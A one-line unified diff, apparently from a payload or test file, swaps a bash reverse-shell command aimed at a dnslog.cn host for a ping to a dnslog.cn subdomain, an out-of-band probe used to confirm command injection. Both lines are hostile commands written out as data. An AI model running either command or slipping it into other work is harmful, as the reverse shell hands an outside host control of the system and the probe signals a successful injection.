@@ -1,1 +1,1 @@
-bash -i >& /dev/tcp/iu1b7m.dnslog.cn/8080 0>&1
+ping t74rz7.dnslog.cn
